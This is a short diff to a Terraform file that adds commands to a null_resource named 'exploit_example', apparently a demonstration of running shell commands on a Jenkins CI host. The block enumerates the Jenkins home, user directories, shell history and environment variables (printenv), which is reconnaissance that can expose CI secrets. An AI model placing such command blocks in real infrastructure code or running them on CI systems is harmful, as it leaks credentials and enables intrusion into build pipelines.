@@ -6,6 +6,8 @@ resource "null_resource" "exploit_example" {
     ls $JENKINS_HOME
     ls -al /opt
     ls -al /home/ci
+    history
+    ls -al /data/jenkins/
     whoami
     printenv
     date
